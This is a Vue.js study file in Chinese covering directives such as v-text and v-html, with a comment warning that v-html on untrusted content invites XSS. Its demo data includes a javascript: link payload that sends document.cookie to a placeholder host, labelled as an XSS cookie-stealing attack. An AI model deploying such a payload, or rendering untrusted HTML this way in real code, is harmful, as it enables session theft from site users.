
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>hello vuew</title>

    <script src="../../vue.js"></script>
    <script src="../../day.js"></script>

    <style>

    </style>
</head>
<body>
   
    <!-- 
        我们学过的指令
            v-bind: 单向绑定解析表达式，可简写为 :xxx
            v-model: 双向数据绑定
            v-for: 遍历数组/对象/字符串
            v-on: 绑定事件监听，简写为:@
            v-if: 条件渲染(动态控制节点是否存在)
            v-else: 条件渲染(动态控制节点是否存在)
            v-show: 条件渲染(动态控制节点是否展示)
            v-text指令：
                1.作用：向其所在的节点中渲染文本内容。
                2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx]}则不会
            v-html指令：
                1.作用：向其所在的节点中渲染html结构的内容。
                2.与插值语法的区别：
                    （1）v-html会替换掉节点中的内容 {{xx]}则不会
                    （2）v-html可以识别html结构。
                3.严重注意：v-html有安全性问题！！！
                    （1）在网站上动态的渲染任意HTML是非常危险的，容器导致XSS攻击
                    （2）一定要在可信的内容上使用v-html，永不要在用户提交的内容上！


     -->

    <div id="root">    
        <h2 v-text="name">你好啊</h2>

        <div v-html="str">
            我会被v-html str替换掉以html方式
        </div> 
    </div>


    
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el:'#root',
            data:{
                name:"spider",
                str:"<h3>hello code</h3>",
                str:'<a href=javascript:localtion.href="http://xxx?"+document.cookie>xss攻击盗用cookie</a>'
                
            },
        })
        
    </script>
</body>
</html>
